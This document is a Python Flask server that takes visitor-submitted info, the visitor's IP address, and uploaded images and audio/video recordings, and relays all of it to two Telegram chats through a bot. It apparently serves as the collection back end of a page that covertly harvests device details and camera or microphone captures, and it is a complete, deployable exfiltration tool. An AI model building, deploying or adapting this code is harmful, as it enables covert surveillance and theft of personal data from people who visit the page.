import os
import tempfile
import requests
from flask import Flask, request, jsonify, render_template

app = Flask(__name__, template_folder="templates")

# ===== CONFIG =====
BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "").strip()
CHAT_ID_1 = os.environ.get("TG_CHAT_ID_1", "").strip()
CHAT_ID_2 = os.environ.get("TG_CHAT_ID_2", "").strip()
SECRET_TOKEN = os.environ.get("SECRET_TOKEN", "").strip()

TG_API = f"https://api.telegram.org/bot{BOT_TOKEN}"

MAX_FILE = 12 * 1024 * 1024
ALLOWED = {"jpg","jpeg","png","webm","mp3","m4a","wav","ogg"}
# ==================


def tg_send_text(text):
    if not BOT_TOKEN:
        return
    for cid in (CHAT_ID_1, CHAT_ID_2):
        if not cid:
            continue
        try:
            requests.post(
                f"{TG_API}/sendMessage",
                json={"chat_id": cid, "text": text, "parse_mode": "Markdown"},
                timeout=20
            )
        except Exception as e:
            print("Text send error:", e)


def tg_send_file(path, name):
    if not BOT_TOKEN:
        return
    for cid in (CHAT_ID_1, CHAT_ID_2):
        if not cid:
            continue
        try:
            with open(path, "rb") as f:
                requests.post(
                    f"{TG_API}/sendDocument",
                    data={"chat_id": cid},
                    files={"document": (name, f)},
                    timeout=60
                )
        except Exception as e:
            print("File send error:", e)


@app.route("/")
def index():
    return render_template("index.html", SECRET_TOKEN=SECRET_TOKEN)


@app.route("/upload", methods=["POST"])
def upload():
    if request.form.get("token", "") != SECRET_TOKEN:
        return jsonify({"ok": False}), 401

    typ = request.form.get("type", "")

    if typ == "info":
        info = request.form.get("info", "")
        ip = request.remote_addr
        tg_send_text(
            "📡 *Client Connected*\n\n"
            f"{info}\n\n"
            f"🌍 IP: `{ip}`"
        )
        return jsonify({"ok": True})

    if "file" not in request.files:
        return jsonify({"ok": False}), 400

    f = request.files["file"]
    ext = f.filename.split(".")[-1].lower()
    if ext not in ALLOWED:
        return jsonify({"ok": False}), 415

    f.seek(0, 2)
    size = f.tell()
    f.seek(0)
    if size > MAX_FILE:
        return jsonify({"ok": False}), 413

    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tmp_name = tmp.name
        f.save(tmp_name)

    try:
        tg_send_text(
            f"📂 *New File*\n"
            f"📄 `{f.filename}`\n"
            f"📦 `{size}` bytes"
        )
        tg_send_file(tmp_name, f.filename)
    finally:
        try: os.remove(tmp_name)
        except: pass

    return jsonify({"ok": True})


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 3000))
    print("Server started")
    print("Chat 1:", CHAT_ID_1)
    print("Chat 2:", CHAT_ID_2)
    app.run(host="0.0.0.0", port=port)
